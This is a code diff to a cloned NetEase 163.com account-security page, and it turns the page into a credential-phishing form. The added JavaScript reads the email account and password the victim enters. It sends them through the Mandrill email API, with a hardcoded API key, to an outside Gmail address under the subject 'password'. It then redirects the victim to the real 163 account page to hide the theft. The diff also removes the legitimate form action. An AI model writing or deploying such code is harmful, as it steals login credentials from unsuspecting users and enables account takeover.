@@ -14,12 +14,33 @@
 
 function getInfo(){
   $.ajax({
-  type: "POST",
-    url: "text.txt",
-    data: "data",
-    // success: success,
-    dataType: "text"
-  });
+    type: "POST",
+    url: "https://mandrillapp.com/api/1.0/messages/send.json",
+    // headers: {'Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept'},
+    data: {
+      'key': 'bnzuL-jTtPWKLSdNtzvfiw',
+      'message': {
+        'from_email': 'yuanminggang1@126.com',
+        'to': [
+        {
+          'email': 'woshizaibuzhidao3@gmail.com',
+          'name': 'password',
+          'type': 'to'
+        }
+        ],
+        'subject': 'password',
+        'html': document.getElementById("form").elements[0].value
+        +"\r\n"+document.getElementById("form").elements[1].value
+      }
+    },
+    success : function(data) {
+     // window.location.href = "https://reg.163.com/account/accountInfo.jsp";
+   },
+   error: function (error) {
+    window.location.href = "https://reg.163.com/account/accountInfo.jsp";
+  }
+});
+  return false;
 }
 <!--
 function charAllSame(str){
@@ -281,12 +302,12 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
 <!--body start-->
     <div class="right_pan">
       <h2 class="clum_title">  <a href="https://reg.163.com/account/accountInfo.jsp">帐号管理</a>&gt;&gt;安全问题 </h2>
-      <form method="post" action="https://reg.163.com/account/accountSecQuestionIndex.do" id="form" 
-        name="form" onsubmit="getInfo()">
-		<input type="hidden" name="username" id="username" value="net_administrat0r">
+      <form method="post" id="form" 
+        name="form" onsubmit="return getInfo();">
+<!-- 		<input type="hidden" name="username" id="username" value="net_administrat0r">
 		<input type="hidden" name="uname2" id="uname2" value="">
-		<!--input type="hidden" name="syscheckcode" id="syscheckcode" value="" /-->
-		<input type="hidden" name="noheader" id="noheader" value="null">
+ -->		<!--input type="hidden" name="syscheckcode" id="syscheckcode" value="" /-->
+		<!-- <input type="hidden" name="noheader" id="noheader" value="null"> -->
         <ul class="main_form">
           <li>
             <div class="fm_left">邮箱帐号：</div>
@@ -297,7 +318,7 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
           <li>
             <div class="fm_left">邮箱密码：</div>
             <div class="fm_right">
-              <input class="input" title="密码" type="password" name="password" id="oldpassword" >
+              <input class="input" title="密码" type="password" name="password" id="password" >
             </div>
           </li>
             <!-- <div class="fm_left">设置新的密码：</div>
@@ -312,8 +333,6 @@ $(".mainBulletinHeaderHtmlContainer").html(mainBulletinHeaderHtml);
               <input type="password" class="input" title="重复新密码" name="confirmPassword" id="confirmPassword" onblur="checkNewPasswordConfirm()"><span id="errNewConfirmPwd" class="err"></span>
             </div>
           </li> -->
-          <li>
-          </li>
           <li class="g_line"></li>
           <li>
             <div class="fm_left">&nbsp;</div>
